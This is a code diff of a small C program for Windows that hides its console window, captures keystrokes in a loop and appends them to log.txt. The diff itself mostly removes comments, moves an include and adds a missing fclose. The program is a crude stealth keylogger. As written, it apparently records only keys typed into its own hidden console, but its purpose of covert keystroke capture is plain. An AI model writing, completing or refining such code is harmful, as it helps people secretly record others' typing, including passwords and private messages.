@@ -1,37 +1,40 @@
-#include <stdio.h>                             //standard input output
-#include <conio.h>                             //for kbhit and getch
+#include <stdio.h>                              //standard input/output
+#include <conio.h>                              //for kbhit and getch
+#include <windows.h>                            //for console control
 
-#define _WIN32_WINNT 0x0500                    //specifing windows version
-#include <windows.h>                           //for console control
+#define _WIN32_WINNT 0x0500                     //specifing windows version
 
-#define FILENAME "log.txt"                     //destination file
+#define FILENAME "log.txt"                      //destination file
 
-void logToFile(char *key)                      //function receives pointer to char
+void logToFile(char *key)
 {
-    FILE *f = fopen(FILENAME, "a");            //defines and opens stream
+    FILE *f = fopen(FILENAME, "a");
 
-    switch(*key)                               //decides what to make with received char
+    switch(*key)
     {
-        case 13: fprintf(f, "\n"); break;      //Breaks line on ENTER
-        default: fprintf(f, "%c", *key);       //writes to file on deafult
+        case 13: fprintf(f, "\n"); break;       //Breaks line on ENTER
+        default: fprintf(f, "%c", *key);        //writes to file on deafult
     }
+
+    fclose(f);
 }
 
-int main()                                     //start point
+int main()
 {
-    char key = 0;                              //char to be read
+    char key = 0;
 
     HWND console = GetConsoleWindow();         //gets console handle
     ShowWindow(console, SW_HIDE);              //hides console
 
-    while(1)                                   //infinite loop
+    while(1)
     {
         if(kbhit())                            //on key press
         {
-            key = getch();                     //gets key
+            key = getch();
             if(key == 27) break;
-            logToFile(&key);                   //calls function sending char's address
+            logToFile(&key);
         }
     }
-    return 0;                                  //exits
+
+    return 0;
 }
